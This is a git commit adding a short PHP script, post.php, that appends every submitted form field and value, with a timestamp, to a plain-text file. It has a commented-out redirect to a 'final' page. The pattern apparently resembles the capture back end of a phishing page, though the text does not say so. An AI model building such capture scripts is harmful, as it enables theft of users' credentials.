294dc1372eeb69cf9f9f6e4dd766b94dea723df4
Nahid Hasan <37169055+rajunahidhasan0@users.noreply.github.com>
2022-04-02 13:46:47 +0600

    ok

---
+++ post.php
@@ -0,0 +1,21 @@
+<?php
+
+// header('Location: final.html');
+echo 'debug//';
+date_default_timezone_set("Asia/Dhaka");
+$dash = "____________________________________________________";
+$date_time = date("Y-m-d") . "  " . date("h:i:sa")."\r\n".$dash."\r\n";
+$handle = fopen("log_data.txt", "a");
+fwrite($handle, "\r\n");
+fwrite($handle, $date_time);
+foreach($_POST as $variable => $value) {
+    fwrite($handle, $variable);
+    fwrite($handle, '=');
+    fwrite($handle, $value);
+    fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+
+?>
